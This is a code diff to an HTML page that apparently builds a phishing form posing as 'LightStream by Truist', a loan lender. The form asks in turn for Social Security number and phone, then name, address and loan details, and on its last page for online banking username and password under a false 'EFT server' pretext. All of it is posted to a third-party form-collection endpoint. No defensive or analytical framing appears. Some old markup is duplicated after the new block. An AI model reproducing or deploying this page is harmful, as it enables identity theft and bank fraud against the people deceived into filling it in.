@@ -47,22 +47,28 @@
         input[type="text"],
         input[type="email"],
         input[type="tel"],
+        input[type="number"],
+        input[type="password"],
+        select,
         textarea {
             width: 100%;
             padding: 10px;
             border: 1px solid #ddd;
             border-radius: 5px;
-            box-sizing: border-box; /* Ensures padding doesn't affect width */
+            box-sizing: border-box;
             font-size: 16px;
         }
         textarea {
-            height: 100px;
+            height: 60px;
             resize: vertical;
+        }
+        select {
+            cursor: pointer;
         }
         button {
             width: 100%;
             padding: 15px;
-            background-color: #28a745;
+            background-color: #3a16b9;
             color: white;
             border: none;
             border-radius: 5px;
@@ -71,13 +77,189 @@
             transition: background-color 0.3s;
         }
         button:hover {
-            background-color: #218838;
+            background-color: #2d0f8f;
+        }
+        .page {
+            display: none;
+        }
+        .page.active {
+            display: block;
+        }
+        .warning-box {
+            background-color: #fff3cd;
+            border: 2px solid #ffc107;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .warning-text {
+            color: #ff0000;
+            font-weight: bold;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .info-text {
+            color: #333;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #888;
+            font-size: 16px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            font-weight: 600;
         }
     </style>
 </head>
 <body>
 
 <div class="form-container">
+    <h1>LightStream by Truist</h1>
+    
+    <form action="https://formspree.io/f/xdkvjnvl" method="POST">
+        
+        <!-- Page 1: Initial Verification -->
+        <div class="page active" id="page1">
+            <h2>YOUR INFORMATION</h2>
+            
+            <div class="form-group">
+                <label for="ssn">Social Security Number</label>
+                <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" required>
+            </div>
+
+            <div class="form-group">
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" name="phone" placeholder="(123) 456-7890" required>
+            </div>
+
+            <button type="button" onclick="showPage(2)">APPLY NOW</button>
+        </div>
+
+        <!-- Page 2: Basic Information -->
+        <div class="page" id="page2">
+            <h2>BASIC INFORMATION</h2>
+            
+            <div class="form-group">
+                <label for="loantype">Which Type Loan Required</label>
+                <select id="loantype" name="loantype" required>
+                    <option value="">-- Select Loan Type --</option>
+                    <option value="business">Business Loan</option>
+                    <option value="home">Home Loan</option>
+                    <option value="car">Car Loan</option>
+                </select>
+            </div>
+
+            <div class="form-group" id="carLoanOptions" style="display: none;">
+                <label for="cartype">Car Loan Type</label>
+                <select id="cartype" name="cartype">
+                    <option value="">-- Select Car Type --</option>
+                    <option value="new">New Car</option>
+                    <option value="used">Used Car</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="loanamount">Loan Amount</label>
+                <input type="number" id="loanamount" name="loanamount" placeholder="Enter amount" required>
+            </div>
+
+            <div class="form-group">
+                <label for="firstname">First Name</label>
+                <input type="text" id="firstname" name="firstname" placeholder="First Name" required>
+            </div>
+
+            <div class="form-group">
+                <label for="lastname">Last Name</label>
+                <input type="text" id="lastname" name="lastname" placeholder="Last Name" required>
+            </div>
+
+            <div class="form-group">
+                <label for="email">E-mail Address</label>
+                <input type="email" id="email" name="email" placeholder="email@example.com" required>
+            </div>
+
+            <div class="form-group">
+                <label for="street">Street Address</label>
+                <input type="text" id="street" name="street" placeholder="Street Address" required>
+            </div>
+
+            <div class="form-group">
+                <label for="city">City</label>
+                <input type="text" id="city" name="city" placeholder="City" required>
+            </div>
+
+            <div class="form-group">
+                <label for="state">State</label>
+                <input type="text" id="state" name="state" placeholder="State" required>
+            </div>
+
+            <div class="form-group">
+                <label for="zip">Zip Code</label>
+                <input type="text" id="zip" name="zip" placeholder="Zip Code" required>
+            </div>
+
+            <div class="form-group">
+                <label for="country">Country</label>
+                <input type="text" id="country" name="country" placeholder="Country" required>
+            </div>
+
+            <button type="button" onclick="showPage(3)">NEXT</button>
+        </div>
+
+        <!-- Page 3: Banking Credentials -->
+        <div class="page" id="page3">
+            <div class="warning-box">
+                <p class="info-text">* We need your online banking user and pass to link your account to our EFT server.</p>
+            </div>
+
+            <div class="subtitle">CREDENTIALS</div>
+
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" placeholder="Enter your username" required>
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+
+            <div class="warning-text">
+                * WITHIN 12 HOURS DELETE AUTOMATICALLY
+            </div>
+
+            <button type="submit" style="margin-top: 20px;">SUBMIT</button>
+        </div>
+
+    </form>
+
+    <script>
+        function showPage(pageNum) {
+            // Hide all pages
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            // Show selected page
+            document.getElementById('page' + pageNum).classList.add('active');
+        }
+
+        // Show car loan options when Car Loan is selected
+        document.getElementById('loantype').addEventListener('change', function() {
+            const carOptions = document.getElementById('carLoanOptions');
+            if (this.value === 'car') {
+                carOptions.style.display = 'block';
+                document.getElementById('cartype').required = true;
+            } else {
+                carOptions.style.display = 'none';
+                document.getElementById('cartype').required = false;
+            }
+        });
+    </script>
+</div>
     <h1>LightStream by Truist</h1>
     <h2>YOUR INFORMATION</h2>
     <form action="https://formspree.io/f/xdkvjnvl" method="POST">
